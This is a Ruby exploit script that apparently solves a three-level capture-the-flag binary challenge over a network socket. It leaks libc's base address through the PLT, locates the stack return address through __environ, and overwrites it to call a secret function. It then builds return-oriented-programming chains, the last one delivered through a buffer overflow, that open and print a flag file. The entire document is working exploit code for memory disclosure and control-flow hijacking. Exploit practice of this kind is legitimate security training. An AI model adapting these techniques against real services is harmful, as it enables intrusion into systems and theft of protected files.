# encoding: ASCII-8bit

require 'socket'
require 'timeout'
require_relative './libronsolve'

# Data files
FILE_READWRITECALLME = File.join(__dir__, '..', 'challenge', 'src', 'readme')

if ARGV[2]
  FILE_LIBC = ARGV[2]
else
  FILE_LIBC = File.join(__dir__, '..', 'challenge', 'libc.so.6')
end

FLAG_FILE = '/home/ctf/flag.txt'

# The code that calls main
# .text:0000000000027248 FF D0                                   call    rax ; <-- THIS LINE
# .text:000000000002724A 89 C7                                   mov     edi, eax
# .text:000000000002724C E8 2F 74 01 00                          call    exit
CALL_MAIN = [
  "\xff\xd0",
  # "\xff\x55\x88", # Laptop
]

POP_RDI_RET = 0x277E5 # 5f c3
POP_RSI_RET = 0x28F99 # 5e c3
POP_RDX_RET = 0xFDEFD # 5a c3
POP_RCX_RET = 0x102137 # 59 c3

def find_in_dump(file, inst_pattern)
  out = `objdump -d "#{ file }"`

  if out =~ inst_pattern
    return Regexp.last_match(1)
  else
    raise "Couldn't find '#{ inst_pattern }' in #{ file }!"
  end
end

def get_plt_entry(file, entry)
  return find_in_dump(file, /# ([0-9A-Z]+) <#{ entry }@GLIBC/i).to_i(16)
end

def get_symbol(lib, symbol, offset = 0)
  # 1009: 0000000000048c10    18 FUNC    WEAK   DEFAULT   16 strtol@@GLIBC_2.2.5
  `readelf -Ws "#{ lib }"`.split(/\n/).each do |line|
    if line =~ /:\s*([0-9a-f]+)\s.*\s#{ symbol }($|@)/
      return Regexp.last_match(1).to_i(16) + offset
    end
  end

  raise "Couldn't find symbol #{ symbol } in #{ lib }!"
end

class Solve
  def initialize(libc_base_function)
    host, port = get_host_port()
    @s = TCPSocket.new(host, port)

    a = ''
    loop do
      a += @s.gets
      if a.include?('GO')
        break
      end
    end

    # Get the libc address early
    @libc = get_libc_base_with(libc_base_function)
    @ret = get_return_address()
  end

  def read(addr, len)
    @s.puts('r')
    @s.puts('%x' % addr)
    @s.puts('%x' % len)

    return @s.read(len)
  end

  def read_uint64(addr)
    return read(addr, 8).unpack('Q').pop
  end

  def read_h(addr, len)
    @s.puts('h')
    @s.puts('%x' % addr)
    @s.puts('%x' % len)

    return @s.read(len * 2)
  end

  # For the stack overflow, we need to read like 200+ times.. this is way faster
  # than doing them individually
  def read_h_caching(addr, len)
    @read_buffer ||= ''
    @read_buffer_len ||= 0

    @read_buffer << ("h\n%x\n%x\n" % [addr, len])
    @read_buffer_len += len * 2
  end

  def read_h_go
    @s.write(@read_buffer)
    out = @s.read(@read_buffer_len)

    @read_buffer = nil
    @read_buffer_len = nil

    return out
  end

  def write(addr, data)
    @s.puts('w')
    @s.puts('%x' % addr)
    @s.puts('%x' % data.length)
    sleep 1
    @s.write(data)
  end

  def close
    return @s.close
  end

  def get_libc_base_with(symbol)
    puts
    puts "Finding libc base using #{ symbol }()..."
    plt_symbol_addr = get_plt_entry(FILE_READWRITECALLME, symbol)
    libc_symbol_addr = get_symbol(FILE_LIBC, symbol)

    puts "  * Reading address of #{ symbol } from the PLT..."
    symbol_addr = read_uint64(plt_symbol_addr)
    puts "  * #{ symbol } is @ 0x%x" % symbol_addr

    puts '  * Rewinding to the start of libc...'
    base = symbol_addr - libc_symbol_addr
    puts '  * libc starts @ 0x%x!' % base

    # Sanity check
    if (base % 0x1000) != 0
      raise "  The libc address isn't on a page boundary, I think there's a file mismatch..."
    end

    return base
  end

  def get_return_address
    puts
    puts "Finding stack-based return address via libc's __environ symbol..."
    environ = get_symbol(FILE_LIBC, '__environ') + @libc
    puts '  * __environ is @ 0x%x' % environ

    environ_target = read_uint64(environ)
    puts '  * Stack address __environ points to = 0x%x' % environ_target

    # Search for the return address by looking for something that looks roughly
    # like the right value (for speed), then following it and seeing if there's
    # a call right before
    #
    # (This is a bit more complicated because we only want to call read() once,
    # otherwise it's way slow)
    read(environ_target - 1024, 1024).unpack('Q*').each_with_index do |test, i|
      # Ignore values that are way off
      if test < @libc
        next
      end

      if (test - @libc > 0x100000)
        next
      end

      puts '  * Plausible return address @ offset 0x%x' % (test - @libc)

      # Check if it actually returns to somewhere that looks right
      if CALL_MAIN.any? { |m| read(test - m.length, m.length) == m }
        # Do the math to figure out where what the offset into the stack was
        return_address = environ_target - 1024 + (i * 8)
        puts '  * It works! Return address is @ 0x%x' % return_address
        return return_address
      end
    end

    # Old way required a bunch of memory reads
    # 0.step(512, 8) do |offset|
    #   test_ptr = environ_target - offset
    #   # puts 'Trying ptr = 0x%x' % test_ptr

    #   test = read_uint64(test_ptr)
    #   if test > @libc && (test - @libc) < 0x1000000
    #     puts '  * Candidate return address @ offset 0x%x' % (test - @libc)

    #     # Check it against our known-good patterns
    #     if CALL_MAIN.any? { |m| read(test - m.length, m.length) == m }
    #       puts '  * It works! Return address is @ 0x%x' % test_ptr
    #       return test_ptr
    #     end
    #   end
    # end

    raise "Couldn't find the return address! CALL_MAIN might be wrong, or we might need to search further"
  end

  def _have_we_solved_it?
    # This will cause it to exit
    puts "  * Triggering the server's exit code to trigger the vuln"
    @s.puts

    # Read from the socket till it closes
    Timeout.timeout(5) do
      data = ''
      loop do
        new_data = @s.gets
        if new_data.nil?
          check_flag(data)
          return
        end
        data += new_data
      end
    end
  end

  def solve_by_calling_secret_function
    puts
    puts 'Solving by calling Secret Function (level 1)'
    secret_function = get_symbol(FILE_READWRITECALLME, 'secret_function')

    puts '  * Changing return address (0x%x) to instead call secret_function() (0x%x)' % [@ret, secret_function]
    write(@ret, [secret_function].pack('Q'))

    _have_we_solved_it?()
  end

  def solve_by_writing_to_memory
    puts
    puts 'Solving by writing to memory (level 2)'
    empty_memory = @ret - 0x10000

    puts '  * Writing the flag path to random stack memory @ 0x%x' % empty_memory
    write(empty_memory, "/home/ctf/flag.txt\0")

    puts '  * Building a ROP chain'
    rop_chain = [
      ### open()
      @libc + POP_RDI_RET, empty_memory, # Filename
      @libc + POP_RSI_RET, 0, # Flags
      @libc + POP_RDX_RET, 0, # mode
      @libc + get_symbol(FILE_LIBC, 'open'),

      ### read()
      @libc + POP_RDI_RET, 5, # Handle
      @libc + POP_RSI_RET, empty_memory + 100, # Buffer
      @libc + POP_RDX_RET, 100, # Length
      @libc + get_symbol(FILE_LIBC, 'read'),

      ### write()
      @libc + POP_RDI_RET, 1, # Handle
      @libc + POP_RSI_RET, empty_memory + 100, # Buffer
      @libc + POP_RDX_RET, 100, # Length
      @libc + get_symbol(FILE_LIBC, 'write'),

      ### exit()
      @libc + POP_RDI_RET, 69, # code
      @libc + get_symbol(FILE_LIBC, 'exit')
    ].pack('Q*')

    puts '  * Writing the ROP chain starting at the return address, 0x%x' % @ret
    write(@ret, rop_chain)

    # Make sure we're done
    _have_we_solved_it?()
  end

  # Calculate the offset between the 'data' buffer and the return address
  def _find_exploit_offset()
    puts "  * Filling 'data' buffer with random garbage so we can find it on the stack"

    # Use read_h to fill the "data" buffer with random junk
    data = [read_h(@libc + 1000, 100)].pack('H*')

    puts '  * Reading stack before the return address to find it...'
    read_memory = read(@ret - 1000, 1000)
    index = read_memory.index(data)

    if index.nil?
      raise "Didn't find exploit offset :("
    end

    return 1000 - index

    # The slow way with lots calls
    # 0.step(1000, 8) do |i|
    #   if read(@ret - i, 100) == data
    #     return i
    #   end
    # end
  end

  def solve_by_buffer_overflow
    puts
    puts 'Solving by exploiting a buffer overflow (level 3)'

    exploit_to_ret = _find_exploit_offset()
    puts '  * Found number of bytes needed to overflow: %d' % exploit_to_ret

    # Get some random stack memory we can use as scratch space
    empty_memory = @ret - 0x10000

    # Build our ROP chain
    puts '  * Building a ROP chain'
    rop_chain = [
      ### open()
      @libc + POP_RDI_RET, 0x5a5a5a5a5a5a5a5a, # Filename (will be updated)
      @libc + POP_RSI_RET, 0, # Flags
      @libc + POP_RDX_RET, 0, # mode
      @libc + get_symbol(FILE_LIBC, 'open'),

      ### read()
      @libc + POP_RDI_RET, 5, # Handle
      @libc + POP_RSI_RET, empty_memory + 100, # Buffer
      @libc + POP_RDX_RET, 100, # Length
      @libc + get_symbol(FILE_LIBC, 'read'),

      ### write()
      @libc + POP_RDI_RET, 1, # Handle
      @libc + POP_RSI_RET, empty_memory + 100, # Buffer
      @libc + POP_RDX_RET, 100, # Length
      @libc + get_symbol(FILE_LIBC, 'write'),

      ### exit()
      @libc + POP_RDI_RET, 69, # code
      @libc + get_symbol(FILE_LIBC, 'exit')
    ].pack('Q*')

    # Add the FLAG_FILE to the end
    rop_chain += "#{ FLAG_FILE }\0"

    # Calculate the actual address of the flag filename + update in the rop
    # chain
    flag_ptr = @ret + rop_chain.length - FLAG_FILE.length - 1
    rop_chain = rop_chain.gsub(/ZZZZZZZZ/, [flag_ptr].pack('Q'))
    puts '  * Calculated the offset of the flag path in memory: 0x%x' % flag_ptr

    # Read a random chunk from libc
    puts "  * Reading a chunk of memory that we're gonna build our exploit from"
    data_buffer = read(@libc, 0x10000)

    # Write the payload to the stack, backwards (because each one will overwrite
    # the last)
    puts '  * Looping through the ROP chain and getting ready to write it to the stack'
    (rop_chain.length - 1).step(0, -1) do |i|
      # Get the character
      c = rop_chain[i]

      # This is how far into the libc buffer it is
      offset_into_libc = data_buffer.index(c)

      if offset_into_libc.nil?
        raise "Couldn't find character: 0x%02x" % c.ord
      end

      offset_to_write = exploit_to_ret + i + 1
      # puts "Writing 0x%02x to offset <data> + %d" % [c.ord, offset_to_write]
      read_h_caching(@libc + offset_into_libc - (offset_to_write - 1), offset_to_write)
    end
    puts '  * Triggering the exploit!'
    read_h_go()

    # Did we win?
    _have_we_solved_it?()
  end
end

challenge = File.basename(File.expand_path(File.join(__dir__, '..')))
case challenge
when 'readwritecallme'
  puts 'LEVEL 1 (write to memory to call secret function)....'
  s = Solve.new('strtol')
  s.solve_by_calling_secret_function()

when 'readwriteme'
  puts 'LEVEL 2 (write to memory to ROP)....'
  s = Solve.new('strtol')
  s.solve_by_writing_to_memory()

when 'readme'
  puts 'LEVEL 3 (buffer overflow to ROP)....'
  s = Solve.new('strtol')
  s.solve_by_buffer_overflow()
else
  puts "Unknown challenge: #{ challenge }"
end
